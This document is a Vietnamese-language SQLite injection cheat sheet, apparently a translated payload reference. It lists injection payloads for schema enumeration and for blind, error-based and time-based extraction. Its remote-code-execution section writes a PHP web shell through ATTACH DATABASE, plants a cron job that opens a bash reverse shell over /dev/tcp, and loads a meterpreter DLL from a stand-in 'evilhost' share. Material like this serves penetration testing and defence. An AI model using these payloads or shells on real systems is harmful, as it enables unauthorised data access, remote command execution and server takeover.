# SQLite Injection

> **SQLite Injection** là một dạng lỗ hổng bảo mật xảy ra khi kẻ tấn công có thể chèn hoặc “inject” mã SQL độc hại vào các truy vấn SQL được thực thi bởi cơ sở dữ liệu SQLite. Lỗ hổng này xuất hiện khi dữ liệu đầu vào của người dùng được đưa trực tiếp vào câu lệnh SQL mà không được xử lý hoặc tham số hóa đúng cách, cho phép kẻ tấn công thao túng logic của truy vấn. Các cuộc tấn công SQL Injection có thể dẫn đến truy cập dữ liệu trái phép, thay đổi dữ liệu và nhiều vấn đề bảo mật nghiêm trọng khác.

## Summary

* [SQLite Comments](#sqlite-comments)
* [SQLite Enumeration](#sqlite-enumeration)
* [SQLite String](#sqlite-string)

  * [SQLite String Methodology](#sqlite-string-methodology)
* [SQLite Blind](#sqlite-blind)

  * [SQLite Blind Methodology](#sqlite-blind-methodology)
  * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
* [SQlite Error Based](#sqlite-error-based)
* [SQlite Time Based](#sqlite-time-based)
* [SQlite Remote Code Execution](#sqlite-remote-code-execution)

  * [Attach Database](#attach-database)
  * [Load_extension](#load_extension)
* [SQLite File Manipulation](#sqlite-file-manipulation)

  * [SQLite Read File](#sqlite-read-file)
  * [SQLite Write File](#sqlite-write-file)
* [References](#references)

## SQLite Comments

| Mô tả              | Comment |
| ------------------ | ------- |
| Comment một dòng   | `--`    |
| Comment nhiều dòng | `/**/`  |

## SQLite Enumeration

| Mô tả          | SQL Query                  |
| -------------- | -------------------------- |
| Phiên bản DBMS | `select sqlite_version();` |

## SQLite String

### SQLite String Methodology

| Mô tả                                                  | SQL Query                                                                                              |
| ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| Trích xuất cấu trúc Database                           | `SELECT sql FROM sqlite_schema`                                                                        |
| Trích xuất cấu trúc Database (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master`                                                                        |
| Trích xuất tên Table                                   | `SELECT tbl_name FROM sqlite_master WHERE type='table'`                                                |
| Trích xuất tên Table                                   | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
| Trích xuất tên Column                                  | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'`             |
| Trích xuất tên Column                                  | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');`                      |
| Trích xuất tên Column                                  | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`                                     |
| Trích xuất tên Column                                  | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')`                                                   |

## SQLite Blind

### SQLite Blind Methodology

| Mô tả                             | SQL Query                                                                                                                                                                                              |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Đếm số lượng Table                | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table`                                                                               |
| Liệt kê tên Table                 | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number`                                                       |
| Trích xuất thông tin              | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')`                                                    |
| Trích xuất thông tin (`order by`) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |

### SQLite Blind With Substring Equivalent

| Function    | Example                                  |
| ----------- | ---------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`    |

## SQlite Error Based

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## SQlite Time Based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## SQLite Remote Code Execution

### Attach Database

Đoạn mã này minh họa cách kẻ tấn công có thể lạm dụng tính năng `ATTACH DATABASE` của SQLite để tạo một web shell trên máy chủ:

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

Đầu tiên, nó yêu cầu SQLite “coi” một file PHP là một database có thể ghi. Sau đó, nó tạo một Table bên trong file đó — thực tế đây sẽ trở thành web shell trong tương lai. Cuối cùng, nó ghi mã PHP độc hại vào file.

**Note:** Việc sử dụng `ATTACH DATABASE` để tạo file có một nhược điểm: SQLite sẽ thêm các byte header đặc trưng của SQLite (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, tức *"SQLite format 3"*). Các byte này sẽ làm hỏng phần lớn script phía server, nhưng PHP có khả năng xử lý khá đặc biệt: miễn là thẻ `<?php` xuất hiện ở bất kỳ vị trí nào trong file, PHP interpreter sẽ bỏ qua phần dữ liệu rác phía trước và thực thi đoạn code được nhúng.

```ps1
file shell.php  
shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

Nếu không thể upload PHP web shell nhưng service đang chạy với quyền `root`, kẻ tấn công có thể sử dụng kỹ thuật tương tự để tạo một cron job kích hoạt reverse shell:

```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
```

Điều này ghi thêm một cron entry mới, được thực thi mỗi phút và tạo kết nối quay trở lại máy của kẻ tấn công.

### Load_extension

:warning: Khả năng load các shared library bên ngoài của SQLite bị vô hiệu hóa theo mặc định trong hầu hết môi trường. Khi được bật, SQLite có thể load một module đã biên dịch thông qua hàm SQL `load_extension()`:

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

Trong SQLite3 command-line shell, có thể hiển thị cấu hình runtime bằng:

```sql
sqlite> .dbconfig
    load_extension on
```

Nếu thấy `load_extension on` hoặc `off`, điều đó cho biết runtime hiện tại của shell có cho phép load shared-library extension hay không.

Một SQLite extension đơn giản là một native shared library, thường là file `.so` trên Linux hoặc `.dll` trên Windows, cung cấp một hàm khởi tạo đặc biệt. Khi extension được load, SQLite gọi hàm này để đăng ký các SQL function, virtual table hoặc những tính năng khác do module cung cấp.

Để biên dịch một loadable extension trên Linux, có thể sử dụng:

```ps1
gcc -g -fPIC -shared demo.c -o demo.so
```

## SQLite File Manipulation

### SQLite Read File

SQLite không hỗ trợ các thao tác I/O trên file theo mặc định.

### SQLite Write File

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```

## References

* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://web.archive.org/web/20211205031408/https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://web.archive.org/web/20210221065923/http://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
